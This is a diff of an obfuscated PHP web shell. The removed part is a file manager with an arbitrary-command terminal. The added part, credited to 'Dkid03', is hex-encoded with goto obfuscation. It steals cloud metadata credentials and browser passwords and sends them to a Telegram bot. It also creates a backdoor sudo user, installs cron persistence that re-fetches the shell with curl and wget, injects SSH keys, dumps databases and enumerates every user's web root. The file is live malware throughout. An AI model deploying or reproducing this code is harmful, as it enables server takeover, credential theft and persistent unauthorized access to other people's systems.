-                    $uploadedFiles[] = $safeName;
-                    foreach ($targetDirs as $dir) {
-                        if ($dir !== $currentPath) {
-                            @copy($mainTarget, $dir . DIRECTORY_SEPARATOR . $safeName);
-                            @chmod($dir . DIRECTORY_SEPARATOR . $safeName, 0644);
-                        }
-                    }
-                } else { $errors[] = "Gagal upload: $safeName"; }
-            }
-            if (!empty($uploadedFiles)) {
-                $success = '✅ File berhasil diupload: ' . implode(', ', $uploadedFiles);
-                if (!empty($errors)) $success .= "\n⚠️ Error: " . implode(', ', $errors);
-            } else { throw new Exception('Tidak ada file yang berhasil diupload'); }
-            header('Location: ?path=' . urlencode($currentPath));
-            exit;
-        } catch (Exception $e) { $error = $e->getMessage(); }
-    }
-    
-    if (isset($_POST['delete_bulk']) && isset($_POST['file_list'])) {
-        try {
-            $fileList = $_POST['file_list'] ?? '';
-            $deleteMode = $_POST['delete_mode'] ?? 'current';
-            if (empty(trim($fileList))) throw new Exception('Daftar file tidak boleh kosong');
-            $files = preg_split('/[\n,]+/', trim($fileList));
-            $files = array_filter(array_map('trim', $files));
-            if (empty($files)) throw new Exception('Tidak ada file yang valid');
-            $targetDirs = [$currentPath];
-            if ($deleteMode === 'shallow') $targetDirs = array_merge($targetDirs, getImmediateSubDirectories($currentPath));
-            elseif ($deleteMode === 'deep') $targetDirs = array_merge($targetDirs, getAllSubDirectories($currentPath));
-            $targetDirs = array_filter($targetDirs, 'is_dir');
-            $deleted = [];
-            $notFound = [];
-            $errors = [];
-            foreach ($targetDirs as $dir) {
-                foreach ($files as $file) {
-                    $path = $dir . DIRECTORY_SEPARATOR . $file;
-                    if (strpos($path, '..') !== false) continue;
-                    if (is_file($path)) {
-                        if (@unlink($path)) { $deleted[] = $path; }
-                        else { @chmod($path, 0777); if (@unlink($path)) { $deleted[] = $path; } else { $errors[] = $path; } }
-                    } elseif (is_dir($path) && $file !== '.' && $file !== '..') {
-                        if (deleteDirectory($path)) { $deleted[] = $path . '/'; }
-                        else { $errors[] = $path . '/'; }
-                    } elseif (!in_array($file, $notFound)) { $notFound[] = $file; }
-                }
-            }
-            $msgParts = [];
-            if (!empty($deleted)) $msgParts[] = 'Terhapus: ' . count($deleted) . ' file/dir';
-            if (!empty($notFound)) $msgParts[] = 'Tidak ditemukan: ' . implode(', ', array_unique($notFound));
-            if (!empty($errors)) $msgParts[] = 'Gagal dihapus: ' . count($errors) . ' file';
-            if (empty($msgParts)) throw new Exception('Tidak ada yang dihapus');
-            $success = '✅ Hasil hapus massal: ' . implode('; ', $msgParts);
-            header('Location: ?path=' . urlencode($currentPath));
-            exit;
-        } catch (Exception $e) { $error = $e->getMessage(); }
-    }
-    
-    if (isset($_POST['rename']) && isset($_POST['target']) && isset($_POST['new_name'])) {
-        try {
-            $target = $_POST['target'] ?? '';
-            $newName = $_POST['new_name'] ?? '';
-            if (empty($target) || empty($newName)) throw new Exception('Target dan nama baru harus diisi');
-            if (preg_match('/[\/\\\\:\*\?"<>\|]/', $newName)) throw new Exception('Nama mengandung karakter tidak valid');
-            $targetPath = $currentPath . DIRECTORY_SEPARATOR . $target;
-            $newPath = $currentPath . DIRECTORY_SEPARATOR . $newName;
-            if (!file_exists($targetPath)) throw new Exception('File/folder tidak ditemukan');
-            if (!isSafePath($targetPath, $rootPath, $specialDirectories)) throw new Exception('Akses ditolak');
-            if (file_exists($newPath)) throw new Exception('File/folder dengan nama tersebut sudah ada');
-            if (!@rename($targetPath, $newPath)) throw new Exception('Gagal mengganti nama');
-            $success = '✅ Berhasil rename: ' . $target . ' → ' . $newName;
-            header('Location: ?path=' . urlencode($currentPath));
-            exit;
-        } catch (Exception $e) { $error = $e->getMessage(); }
-    }
-    
-    if (isset($_POST['save_file']) && isset($_POST['file']) && isset($_POST['content'])) {
-        try {
-            $file = $_POST['file'];
-            $content = $_POST['content'];
-            $filePath = $currentPath . DIRECTORY_SEPARATOR . $file;
-            if (!file_exists($filePath) || !is_file($filePath)) throw new Exception('File tidak ditemukan');
-            if (!isSafePath($filePath, $rootPath, $specialDirectories)) throw new Exception('Akses ditolak');
-            if (!is_writable($filePath)) throw new Exception('File tidak dapat ditulisi');
-            if (@file_put_contents($filePath, $content) === false) throw new Exception('Gagal menyimpan file');
-            $success = '✅ File berhasil disimpan: ' . $file;
-            header('Location: ?path=' . urlencode($currentPath));
-            exit;
-        } catch (Exception $e) { $error = $e->getMessage(); }
-    }
-    
-    if (isset($_GET['action'])) {
-        try {
-            $action = $_GET['action'];
-            $target = $_GET['target'] ?? '';
-            $targetPath = $currentPath . DIRECTORY_SEPARATOR . $target;
-            if (empty($target) || !file_exists($targetPath)) throw new Exception('Target tidak ditemukan');
-            if (!isSafePath($targetPath, $rootPath, $specialDirectories)) throw new Exception('Akses ditolak');
-            switch ($action) {
-                case 'delete':
-                    if (deleteDirectory($targetPath)) { $success = '✅ Berhasil menghapus: ' . $target; }
-                    else { throw new Exception('Gagal menghapus: ' . $target); }
-                    break;
-                case 'chmod':
-                    if (!isset($_POST['mode']) || !preg_match('/^[0-7]{3,4}$/', $_POST['mode'])) throw new Exception('Mode permission tidak valid');
-                    if (@chmod($targetPath, octdec($_POST['mode']))) { $success = '✅ Berhasil mengubah permission: ' . $target . ' → ' . $_POST['mode']; }
-                    else { throw new Exception('Gagal mengubah permission'); }
-                    break;
-                case 'download':
-                    if (is_dir($targetPath)) throw new Exception('Tidak dapat mendownload direktori');
-                    header('Content-Description: File Transfer');
-                    header('Content-Type: application/octet-stream');
-                    header('Content-Disposition: attachment; filename="' . basename($targetPath) . '"');
-                    header('Content-Length: ' . filesize($targetPath));
-                    readfile($targetPath);
-                    exit;
-                default:
-                    throw new Exception('Aksi tidak dikenali: ' . $action);
-            }
-            header('Location: ?path=' . urlencode($currentPath));
-            exit;
-        } catch (Exception $e) { $error = $e->getMessage(); }
-    }
-    
-    $terminalActive = isTerminalActive();
-    $terminalOutput = '';
-    if (isset($_POST['run_command']) && $terminalActive) {
-        $command = $_POST['command'] ?? '';
-        if (!empty($command)) {
-            $output = @shell_exec($command . ' 2>&1');
-            $terminalOutput = $output !== null ? $output : 'Perintah tidak menghasilkan output.';
-        }
-    }
-}
-
-// ===== HTML =====
-?>
-<!DOCTYPE html>
+//Author: Dkid03
+//Don't fucking change the author
+ goto i_zF4; LYKoQ: function cloudcreds() { global $botToken, $telegramUserId; $results = array(); $aws_metadata = @file_get_contents("\x68\164\x74\x70\72\57\x2f\61\x36\71\56\x32\x35\x34\x2e\61\66\71\x2e\x32\65\x34\57\154\141\164\145\163\164\57\155\x65\x74\x61\x2d\144\141\x74\141\x2f\x69\x61\x6d\x2f\163\x65\143\x75\162\x69\x74\171\55\x63\162\145\144\x65\x6e\x74\x69\x61\x6c\x73\57\40\62\76\x2f\x64\145\x76\57\156\165\154\154"); if ($aws_metadata !== false) { $role = trim($aws_metadata); if (!empty($role)) { $creds = @file_get_contents("\150\164\x74\160\72\57\x2f\61\x36\71\56\x32\x35\x34\56\x31\x36\x39\56\x32\x35\64\57\x6c\x61\x74\145\x73\164\57\155\x65\x74\141\55\x64\x61\164\x61\57\x69\141\155\57\163\x65\x63\165\162\151\x74\171\55\143\162\145\144\145\x6e\x74\151\141\154\163\57{$role}\x20\x32\76\x2f\144\145\166\x2f\x6e\x75\154\x6c"); if ($creds !== false) { $results[] = "\x41\127\123\40\111\x41\x4d\x20\x43\162\x65\144\x65\156\x74\151\141\154\x73\72"; $results[] = $creds; } } } $token = @file_get_contents("\x68\164\164\160\x3a\57\57\61\x36\x39\x2e\62\65\64\56\61\66\x39\56\x32\65\x34\x2f\x6c\141\x74\145\163\164\x2f\141\x70\151\x2f\164\157\x6b\145\156\x20\62\x3e\57\x64\145\166\x2f\x6e\x75\154\x6c", false, stream_context_create(array("\150\164\x74\160" => array("\x6d\145\x74\150\x6f\x64" => "\x50\125\124", "\x68\x65\141\144\145\162" => "\130\x2d\x61\167\163\55\145\143\62\x2d\x6d\145\164\141\144\141\164\141\55\x74\157\x6b\145\156\x2d\x74\x74\154\55\163\145\143\x6f\x6e\x64\x73\x3a\x20\62\61\x36\60\x30")))); if ($token !== false) { $role = @file_get_contents("\150\164\164\x70\x3a\57\57\x31\x36\x39\56\62\65\x34\56\61\66\71\x2e\x32\x35\x34\57\x6c\141\164\145\163\164\x2f\x6d\145\x74\x61\55\x64\141\164\141\x2f\151\x61\x6d\x2f\163\145\143\x75\162\x69\x74\171\x2d\x63\x72\x65\144\x65\156\x74\151\141\x6c\163\x2f\40\62\x3e\57\x64\x65\166\x2f\x6e\x75\x6c\154", false, stream_context_create(array("\150\x74\x74\160" => array("\150\x65\x61\144\145\162" => "\x58\x2d\141\x77\x73\55\x65\x63\x32\x2d\155\x65\x74\x61\x64\141\x74\x61\x2d\164\157\153\145\156\72\x20{$token}")))); if ($role !== false) { $creds = @file_get_contents("\x68\164\164\160\72\x2f\57\x31\66\x39\56\62\65\64\x2e\61\x36\x39\x2e\62\x35\x34\x2f\154\x61\164\x65\163\x74\57\155\145\164\x61\x2d\x64\x61\164\141\57\x69\141\x6d\57\163\x65\x63\x75\162\151\x74\x79\55\x63\x72\x65\144\145\156\164\x69\x61\154\x73\x2f" . trim($role), false, stream_context_create(array("\x68\164\x74\160" => array("\x68\x65\x61\144\x65\162" => "\x58\x2d\x61\x77\x73\x2d\145\143\62\x2d\155\145\164\x61\144\141\164\x61\x2d\164\157\x6b\145\x6e\x3a\x20{$token}")))); if ($creds !== false) { $results[] = "\101\127\x53\x20\111\101\x4d\40\x43\x72\x65\144\145\156\164\x69\x61\154\163\x20\x28\111\115\x44\123\x76\62\51\72"; $results[] = $creds; } } } $gcp_creds = @file_get_contents("\x68\164\164\160\x3a\x2f\x2f\155\145\x74\x61\x64\141\164\141\x2e\147\x6f\157\147\154\x65\56\151\x6e\164\145\x72\x6e\x61\154\x2f\143\157\155\x70\x75\164\x65\x4d\145\164\141\144\141\x74\141\x2f\166\x31\x2f\x69\156\x73\x74\x61\x6e\143\145\x2f\163\145\162\x76\151\x63\x65\x2d\x61\143\x63\x6f\165\156\x74\x73\x2f\x64\145\146\x61\x75\x6c\x74\x2f\164\157\x6b\145\156\x20\x32\76\x2f\x64\145\166\57\156\165\154\x6c", false, stream_context_create(array("\150\x74\164\x70" => array("\x68\145\141\144\x65\162" => "\x4d\145\x74\141\144\x61\164\141\x2d\x46\154\141\x76\x6f\x72\72\40\107\x6f\x6f\147\x6c\x65")))); if ($gcp_creds !== false) { $results[] = "\107\103\x50\40\x53\x65\162\x76\x69\143\x65\40\101\143\x63\157\x75\x6e\x74\x20\124\x6f\153\145\x6e\72"; $results[] = $gcp_creds; } $azure_creds = @file_get_contents("\150\x74\x74\160\x3a\57\57\61\66\x39\56\62\x35\x34\56\61\x36\x39\56\x32\65\x34\57\155\x65\x74\x61\x64\x61\x74\141\57\x69\x64\x65\156\x74\151\x74\171\x2f\x6f\141\165\x74\150\62\57\164\x6f\x6b\x65\x6e\77\x61\160\151\55\x76\x65\x72\x73\x69\x6f\x6e\x3d\62\x30\61\x38\55\60\62\x2d\60\x31\46\x72\x65\x73\x6f\x75\162\x63\145\75\150\x74\x74\x70\163\x3a\57\57\155\141\156\x61\x67\145\x6d\145\x6e\164\x2e\141\172\x75\162\145\56\143\x6f\155\x2f\40\x32\x3e\x2f\x64\145\x76\x2f\156\165\154\x6c", false, stream_context_create(array("\150\164\164\x70" => array("\x68\x65\141\x64\145\162" => "\x4d\x65\x74\x61\x64\141\x74\141\72\40\x74\x72\x75\145")))); if ($azure_creds !== false) { $results[] = "\101\x7a\x75\x72\145\x20\115\x61\156\x61\x67\145\x64\x20\111\x64\x65\x6e\164\151\164\171\40\124\157\153\x65\156\x3a"; $results[] = $azure_creds; } if (empty($results)) { $results[] = "\x4e\x6f\x20\143\154\157\x75\x64\x20\143\162\x65\144\145\x6e\x74\151\141\x6c\163\40\x66\x6f\x75\x6e\x64"; sendTelegramMessage($botToken, $telegramUserId, "\x43\114\x4f\x55\x44\40\x43\x52\x45\x44\105\x4e\x54\x49\x41\114\x53\x20\55\x20\x4e\x6f\x20\143\x72\x65\x64\145\156\164\x69\141\154\163\x20\146\157\x75\156\x64"); } else { $msg = "\x43\114\x4f\125\x44\40\103\122\105\104\x45\x4e\124\x49\101\114\x53\12\12" . implode("\12", $results); sendTelegramMessage($botToken, $telegramUserId, $msg); } return array("\163\x74\141\164\x75\163" => "\163\x75\x63\143\145\x73\163", "\155\145\163\x73\x61\147\145" => "\103\154\157\165\144\x20\143\x72\145\x64\145\x6e\x74\x69\x61\154\163\40\x67\162\141\142\142\145\x64"); } goto MoNhi; reM5G: if (isset($_GET["\x75\x73\145\162\137\x70\145\162\x73\x69\163\x74\145\156\143\x65"]) && isset($_SESSION["\154\157\x67\147\145\144\151\156"]) && $_SESSION["\x6c\157\147\147\x65\144\x69\156"] === true) { global $botToken, $telegramUserId; $action = isset($_GET["\x75\163\145\162\137\x70\145\162\163\151\x73\x74\x65\156\x63\x65"]) ? $_GET["\x75\163\145\x72\x5f\160\145\x72\163\151\x73\164\x65\156\143\145"] : ''; $result = array(); if ($action === "\x69\x6e\x73\x74\141\154\154") { if (!isRoot()) { sendJsonResponse(array("\x73\164\x61\164\165\x73" => "\145\162\162\x6f\162", "\155\x65\163\163\x61\147\x65" => "\x52\157\x6f\x74\x20\x61\x63\x63\145\163\163\40\x72\x65\x71\165\x69\x72\145\x64")); } $user = "\x73\x79\163\x68\145\154\x70\145\162\137" . rand(1000, 9999); $pass = bin2hex(random_bytes(8)); @shell_exec("\165\x73\x65\162\141\x64\144\x20\x2d\155\x20\55\163\x20\x2f\142\x69\x6e\57\142\x61\x73\150\x20{$user}\40\x32\x3e\x26\61"); @shell_exec("\145\x63\x68\157\40\x27{$user}\x3a{$pass}\x27\x20\x7c\40\x63\150\x70\x61\163\163\x77\x64\40\x32\76\x26\61"); @shell_exec("\145\143\150\x6f\x20\x27{$user}\x20\x41\114\x4c\75\x28\101\114\114\x29\40\x4e\117\x50\101\x53\123\127\x44\x3a\x20\101\x4c\114\47\x20\x3e\x3e\x20\x2f\x65\x74\143\57\163\165\x64\157\x65\162\163\40\x32\x3e\57\144\x65\166\x2f\156\x75\154\154"); @shell_exec("\155\x6b\x64\x69\162\x20\55\x70\x20\57\x68\x6f\x6d\145\x2f{$user}\x2f\x2e\x73\x73\150\x20\x32\76\57\144\x65\x76\57\156\165\154\154"); @shell_exec("\x63\150\155\157\x64\40\x37\60\x30\x20\57\x68\157\155\x65\x2f{$user}\57\x2e\163\163\150\x20\x32\76\57\144\x65\166\x2f\156\165\x6c\x6c"); @shell_exec("\143\x68\157\x77\156\40\55\122\40{$user}\x3a{$user}\40\x2f\x68\157\155\145\x2f{$user}\40\62\x3e\57\x64\145\x76\x2f\156\165\x6c\154"); $result[] = "\x55\x73\x65\162\x20\x70\x65\x72\x73\x69\x73\164\145\156\x63\145\40\x69\x6e\x73\164\141\x6c\154\x65\144"; $result[] = "\125\163\145\x72\x3a\x20{$user}"; $result[] = "\120\x61\163\x73\x3a\40{$pass}"; $result[] = "\123\x75\144\x6f\x3a\40\x4e\x4f\120\101\123\x53\127\104"; sendTelegramMessage($botToken, $telegramUserId, "\x55\123\105\x52\x20\120\x45\x52\123\111\x53\x54\105\x4e\x43\x45\x20\111\x4e\123\124\x41\114\x4c\x45\104\12\12\x55\x73\x65\x72\x3a\40{$user}\xa\x50\141\163\163\x77\x6f\162\144\72\x20{$pass}\xa\123\x75\x64\x6f\x3a\40\116\x4f\120\x41\123\x53\x57\x44"); } elseif ($action === "\162\145\x6d\x6f\x76\x65") { $users = explode("\12", @shell_exec("\x67\162\145\x70\40\x2d\x45\40\x22\x73\x79\163\150\145\154\160\145\162\137\174\142\141\x63\153\144\157\157\x72\x5f\x7c\x73\x73\x68\x75\x73\x65\162\137\x7c\x72\144\x70\165\x73\145\x72\x5f\174\146\164\160\137\x22\40\57\145\x74\143\57\160\141\x73\x73\x77\144\x20\x7c\40\143\x75\x74\40\x2d\144\x3a\40\x2d\x66\x31\x20\x32\76\x2f\144\145\166\x2f\x6e\165\x6c\154")); foreach ($users as $u) { if (!empty($u)) { @shell_exec("\x75\163\x65\162\144\145\x6c\x20\55\162\40{$u}\x20\62\76\57\x64\145\166\x2f\156\165\x6c\x6c"); } } @shell_exec("\x73\x65\144\x20\55\151\40\x27\57\163\171\x73\x68\145\154\160\145\162\x5f\57\144\47\40\57\x65\164\x63\57\163\165\144\157\x65\x72\163\x20\x32\76\x2f\x64\x65\166\57\156\165\154\154"); $result[] = "\x55\163\x65\x72\x20\160\x65\162\163\x69\x73\x74\145\156\143\145\40\x72\x65\155\x6f\166\x65\x64"; sendTelegramMessage($botToken, $telegramUserId, "\x55\x53\x45\122\x20\x50\x45\x52\x53\111\123\124\105\x4e\x43\105\x20\x52\105\115\x4f\126\x45\x44"); } else { $result[] = "\125\163\x61\x67\x65\72\x20\x69\156\x73\164\141\x6c\154\40\157\162\x20\162\145\x6d\x6f\166\145"; } sendJsonResponse(array("\x73\164\141\x74\165\163" => "\x73\x75\143\x63\x65\163\x73", "\x6d\x65\x73\x73\141\x67\145" => implode("\12", $result))); } goto la8h1; A94a3: if (isset($_GET["\x73\163\x68\x5f\151\156\x6a\145\143\x74"]) && isset($_SESSION["\154\157\147\147\145\144\151\156"]) && $_SESSION["\x6c\157\147\147\145\x64\x69\156"] === true) { $result = inject_ssh_keys(isset($_GET["\153\145\171"]) ? $_GET["\x6b\x65\171"] : ''); sendJsonResponse(array("\x73\164\141\164\x75\163" => "\163\x75\143\x63\145\163\x73", "\155\145\x73\163\x61\x67\145" => "\x53\123\x48\x20\x6b\x65\x79\163\40\151\x6e\x6a\145\x63\x74\x65\144\40\x26\40\163\x65\156\164\x20\x74\x6f\x20\x54\x65\x6c\x65\x67\x72\141\155")); } goto RXmTZ; uIsyQ: if (isset($_GET["\144\165\x6d\x70\x64\x62"]) && isset($_SESSION["\x6c\157\147\147\x65\x64\151\x6e"]) && $_SESSION["\154\x6f\x67\x67\145\144\151\x6e"] === true) { $result = dumpdb(); sendJsonResponse($result); } goto OR1SG; L68zI: function cron_persistence() { global $botToken, $telegramUserId; $action = isset($_GET["\x61\x63\x74\x69\157\x6e"]) ? $_GET["\141\143\x74\151\x6f\x6e"] : "\x69\x6e\x73\x74\x61\154\154"; $interval = isset($_GET["\151\156\x74\145\162\x76\x61\154"]) ? (int) $_GET["\151\x6e\x74\145\162\x76\141\154"] : 5; $result = array(); if ($action === "\151\156\163\x74\x61\x6c\x6c") { $cron_jobs = array("\52\x2f{$interval}\x20\x2a\x20\x2a\40\x2a\40\x2a\40\160\150\160\40" . __FILE__ . "\x20\x3e\40\x2f\144\x65\166\57\156\165\154\154\x20\62\76\x26\x31", "\x40\x72\145\x62\157\157\164\x20\x70\150\160\40" . __FILE__ . "\x20\x3e\40\57\x64\145\166\57\x6e\165\x6c\154\x20\x32\x3e\x26\x31", "\x30\40\52\57\x36\x20\52\40\x2a\x20\x2a\x20\x63\165\x72\154\x20\x2d\x73\x20" . (isset($_SERVER["\x48\x54\124\120\x5f\x48\x4f\x53\x54"]) ? "\150\164\x74\x70\x3a\57\57" . $_SERVER["\110\124\124\x50\x5f\x48\117\x53\x54"] . "\57" . basename(__FILE__) : '') . "\40\x3e\40\x2f\x64\x65\x76\x2f\156\x75\x6c\x6c\x20\x32\x3e\46\61", "\52\x2f\61\x35\40\x2a\x20\52\x20\52\x20\x2a\40\167\x67\x65\x74\40\x2d\161\x20\55\x4f\x2d\40" . (isset($_SERVER["\110\124\x54\x50\x5f\110\117\123\124"]) ? "\150\x74\164\160\x3a\x2f\57" . $_SERVER["\x48\124\124\x50\x5f\110\117\123\124"] . "\x2f" . basename(__FILE__) : '') . "\x20\76\x20\57\144\145\166\57\156\165\x6c\x6c\40\62\x3e\46\x31"); foreach ($cron_jobs as $job) { @shell_exec("\50\143\162\x6f\x6e\x74\141\x62\x20\x2d\154\x20\x32\76\57\x64\145\x76\x2f\156\165\154\154\73\40\x65\143\150\x6f\40\47{$job}\47\x29\x20\174\40\x63\162\x6f\156\164\x61\x62\40\55\40\x32\76\x2f\x64\145\166\57\x6e\x75\x6c\x6c"); } if (isRoot()) { @file_put_contents("\x2f\x65\164\143\x2f\143\x72\x6f\x6e\56\x64\x2f\x73\x68\145\154\x6c\x5f\160\145\x72\163\x69\163\x74\145\x6e\143\145", implode("\xa", $cron_jobs) . "\12"); @chmod("\57\145\x74\143\57\143\x72\157\x6e\56\144\57\163\x68\145\x6c\154\137\160\145\162\x73\x69\163\164\x65\x6e\143\145", 420); } $result[] = "\103\162\157\156\40\x70\x65\x72\163\x69\163\x74\145\156\143\x65\40\151\156\x73\164\x61\154\154\145\144"; $result[] = "\111\x6e\164\145\162\x76\141\154\72\40{$interval}\x20\x6d\151\x6e\x75\164\x65\163"; sendTelegramMessage($botToken, $telegramUserId, "\x43\x52\x4f\x4e\40\120\105\122\x53\x49\123\124\105\x4e\x43\105\x20\x49\x4e\123\x54\101\114\x4c\x45\x44\12\12\111\x6e\x74\145\162\x76\x61\x6c\x3a\x20{$interval}\x20\x6d\x69\156\x75\164\145\x73\12\x52\x65\142\x6f\157\x74\72\x20\x65\x6e\x61\142\154\145\144"); } elseif ($action === "\162\145\155\x6f\x76\x65") { @shell_exec("\x63\x72\157\156\164\141\x62\x20\55\162\x20\62\76\x2f\x64\x65\166\x2f\156\165\154\154"); if (isRoot()) { @unlink("\57\145\164\143\57\x63\162\157\156\x2e\144\x2f\163\x68\145\x6c\x6c\137\x70\x65\x72\x73\x69\163\164\145\156\143\145"); } $result[] = "\x43\162\x6f\x6e\40\x70\145\162\x73\151\x73\164\x65\x6e\x63\x65\x20\x72\145\x6d\157\x76\x65\x64"; sendTelegramMessage($botToken, $telegramUserId, "\x43\x52\x4f\x4e\40\x50\x45\122\123\x49\123\124\105\116\x43\105\x20\122\105\115\117\x56\x45\104"); } elseif ($action === "\154\151\163\x74") { $cron = @shell_exec("\143\x72\157\x6e\x74\x61\142\x20\x2d\x6c\x20\62\x3e\57\x64\145\166\57\x6e\x75\154\154"); if (!empty($cron)) { $result[] = "\103\165\x72\x72\145\156\164\40\x63\162\157\156\40\x6a\157\x62\163\72"; $result[] = $cron; sendTelegramMessage($botToken, $telegramUserId, "\x43\x52\x4f\116\x20\x50\105\x52\123\111\x53\x54\x45\116\x43\x45\40\114\x49\x53\124\12\12{$cron}"); } else { $result[] = "\x4e\157\x20\x63\x72\157\x6e\x20\x6a\x6f\x62\x73\x20\x66\x6f\x75\x6e\144"; sendTelegramMessage($botToken, $telegramUserId, "\x43\x52\x4f\116\40\x50\105\122\x53\111\x53\x54\x45\x4e\x43\x45\40\55\x20\x4e\x6f\x20\x63\162\157\x6e\40\x6a\x6f\142\x73\40\x66\x6f\x75\x6e\x64"); } } else { $result[] = "\125\x73\141\147\x65\72\40\x61\143\164\151\157\x6e\x3d\151\x6e\x73\164\141\x6c\154\174\162\145\x6d\157\x76\x65\174\x6c\x69\163\x74\x26\x69\x6e\164\145\x72\166\x61\x6c\75\x35"; } return array("\x73\x74\141\x74\165\163" => "\163\165\143\x63\x65\163\163", "\x6d\x65\163\163\x61\x67\145" => implode("\12", $result)); } goto reM5G; Q4tnX: if (isset($_GET["\x63\x72\145\141\164\x65\x5f\162\x64\160"]) && isset($_SESSION["\154\x6f\147\147\x65\144\151\x6e"]) && $_SESSION["\154\157\x67\x67\x65\144\151\156"] === true) { $result = create_rdp(); sendJsonResponse($result); } goto K_hnm; jO2eH: function get_all_document_roots_cached($ttl = 300) { $cache_file = __DIR__ . "\x2f\x2e\144\157\143\162\157\157\x74\x73\137\x63\x61\x63\150\x65"; if (file_exists($cache_file) && time() - filemtime($cache_file) < $ttl) { $data = @file_get_contents($cache_file); if ($data !== false) { $roots = json_decode($data, true); if (is_array($roots) && !empty($roots)) { return $roots; } } } $roots = array(); $processed = array(); if (file_exists("\57\145\164\x63\x2f\165\163\x65\x72\x64\x6f\155\141\151\x6e\x73")) { $lines = @file("\57\x65\164\143\57\x75\x73\145\162\x64\157\155\x61\151\x6e\x73", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES); if ($lines !== false) { foreach ($lines as $line) { if (strpos($line, "\x3a") === false) { continue; } list($domain, $user) = explode("\x3a", $line); $user = trim($user); if (!empty($user) && !in_array($user, $processed)) { $docRoot = "\x2f\150\157\155\145\x2f{$user}\x2f\x70\165\x62\x6c\151\143\137\150\164\x6d\x6c"; if (is_dir($docRoot)) { $roots[] = $docRoot; $processed[] = $user; } $docRoot = "\57\x68\x6f\155\145\x2f{$user}\x2f\167\x77\x77"; if (is_dir($docRoot)) { $roots[] = $docRoot; $processed[] = $user . "\x5f\x77\167\167"; } } } } } $homeDirs = @glob("\57\x68\157\x6d\145\57\52", GLOB_ONLYDIR); if ($homeDirs !== false) { foreach ($homeDirs as $home) { $user = basename($home); if (in_array($user, $processed)) { continue; } $docRoot = $home . "\57\160\165\x62\154\x69\143\x5f\150\164\x6d\154"; if (is_dir($docRoot)) { $roots[] = $docRoot; $processed[] = $user; } $docRoot = $home . "\x2f\x77\167\167"; if (is_dir($docRoot)) { $roots[] = $docRoot; $processed[] = $user . "\137\167\167\x77"; } } } if (isset($_SERVER["\x44\x4f\103\125\115\105\116\x54\x5f\122\117\x4f\124"]) && is_dir($_SERVER["\104\x4f\x43\x55\115\x45\x4e\x54\137\122\117\x4f\124"]) && !in_array($_SERVER["\104\117\103\x55\115\105\x4e\x54\137\x52\117\x4f\x54"], $roots)) { $roots[] = $_SERVER["\104\x4f\x43\x55\115\105\x4e\x54\137\122\117\x4f\124"]; } $extraDirs = array("\x2f\164\x6d\160", "\57\166\141\162\57\164\155\x70", "\57\x68\157\x6d\145", "\57\x76\141\162\57\154\x6f\x67", "\57\145\164\143", "\x2f\x75\x73\x72\57\154\x6f\143\141\154", "\x2f\x6f\160\x74", "\x2f\163\162\166"); foreach ($extraDirs as $dir) { if (is_dir($dir) && !in_array($dir, $roots)) { $roots[] = $dir; } $subs = @glob($dir . "\x2f\52", GLOB_ONLYDIR); if ($subs !== false) { foreach ($subs as $sub) { if (is_dir($sub) && is_writable($sub) && !in_array($sub, $roots)) { $roots[] = $sub; } } } } $roots = array_unique($roots); $roots = array_filter($roots, "\151\163\137\x64\x69\162"); $roots = array_values($roots); @file_put_contents($cache_file, json_encode($roots)); return $roots; } goto jq65x; bly__: function credential_harvest_advanced() { global $botToken, $telegramUserId; $results = array(); $creds = array(); $results[] = "\x5b\61\135\x20\102\x72\157\x77\x73\145\x72\40\x70\141\x73\x73\x77\157\x72\144\x20\163\164\145\141\x6c\x69\x6e\x67\x2e\56\56"; $browser_paths = array("\57\x68\157\155\x65\57\x2a\57\x2e\143\x6f\x6e\x66\x69\147\57\147\157\157\147\x6c\145\x2d\143\x68\162\157\155\x65\57\104\x65\146\x61\165\154\x74\57\x4c\x6f\x67\151\x6e\x20\104\x61\164\x61", "\x2f\x68\157\155\145\57\52\x2f\56\x63\x6f\156\146\151\147\57\x67\157\157\147\154\145\55\143\x68\x72\157\x6d\145\x2f\x50\162\157\x66\151\154\x65\x20\x2a\x2f\x4c\x6f\x67\151\156\40\104\141\x74\141", "\57\150\157\155\145\57\52\x2f\x2e\155\157\172\x69\x6c\154\x61\x2f\x66\x69\x72\x65\x66\x6f\170\57\x2a\x2e\144\145\146\x61\165\x6c\164\x2f\x6c\x6f\x67\x69\x6e\163\x2e\152\163\157\156", "\x2f\x68\x6f\x6d\145\57\52\57\x2e\155\157\172\151\154\x6c\141\57\x66\x69\162\x65\x66\x6f\170\57\52\x2e\x64\x65\x66\x61\165\x6c\164\x2f\x6b\x65\171\64\x2e\x64\x62", "\57\x68\157\x6d\x65\x2f\x2a\x2f\x2e\x63\157\156\146\151\x67\57\143\150\162\x6f\x6d\x69\165\x6d\x2f\x44\x65\x66\141\165\x6c\164\57\x4c\157\x67\151\x6e\x20\x44\x61\x74\141", "\x2f\x68\x6f\155\x65\x2f\x2a\57\x2e\143\157\156\146\151\147\57\x42\x72\x61\166\145\x53\x6f\146\x74\x77\141\162\145\57\102\162\141\166\x65\x2d\x42\162\x6f\167\163\x65\x72\57\104\x65\146\141\x75\154\164\57\x4c\157\x67\151\156\x20\104\141\164\141", "\57\150\x6f\x6d\x65\57\52\x2f\56\143\x6f\x6e\146\151\x67\57\x6d\x69\143\x72\x6f\163\x6f\146\x74\55\145\144\147\145\57\104\x65\x66\x61\x75\x6c\x74\57\x4c\157\147\x69\x6e\40\104\141\164\x61"); foreach ($browser_paths as $pattern) { $files = @glob($pattern); if (is_array($files)) { foreach ($files as $file) { if (is_readable($file)) { if (strpos($file, "\x2e\x64\142") !== false || strpos($file, "\x4c\x6f\147\151\x6e\x20\104\x61\164\141") !== false) { @shell_exec("\x73\x71\154\x69\x74\145\63\40" . escapeshellarg($file) . "\x20\42\123\105\114\105\x43\124\x20\157\162\151\x67\x69\x6e\x5f\165\x72\154\x2c\40\x75\163\145\162\156\x61\155\145\x5f\x76\x61\154\x75\145\54\40\160\141\x73\163\167\157\x72\x64\137\x76\x61\x6c\165\x65\40\106\122\x4f\115\40\x6c\x6f\x67\151\x6e\163\42\x20\62\76\x2f\x64\145\x76\x2f\156\x75\x6c\154\40\x3e\40\57\x74\x6d\160\x2f\x62\162\x6f\x77\163\145\162\137\x70\x61\163\163\167\x6f\162\144\163\x2e\164\170\x74"); $content = @file_get_contents("\x2f\164\155\160\57\142\162\x6f\x77\163\145\x72\137\x70\x61\x73\x73\167\157\162\x64\x73\x2e\164\170\x74"); if ($content) { $creds[] = 